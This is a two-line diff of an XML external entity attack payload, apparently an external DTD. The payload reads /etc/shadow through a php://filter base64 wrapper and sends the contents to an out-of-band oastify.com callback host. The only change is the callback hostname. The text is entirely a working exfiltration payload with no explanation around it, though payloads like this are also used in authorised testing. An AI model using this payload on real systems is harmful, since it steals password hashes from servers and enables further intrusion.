@@ -1,2 +1,2 @@
 <!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/shadow">
-<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://cr75l3t3u2mlh0uyaqv4ihhv1m7dv7jw.oastify.com?%data;'>">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://ahv3b1j1k0cj7ykw0ol28f7trkxbla9z.oastify.com?%data;'>">
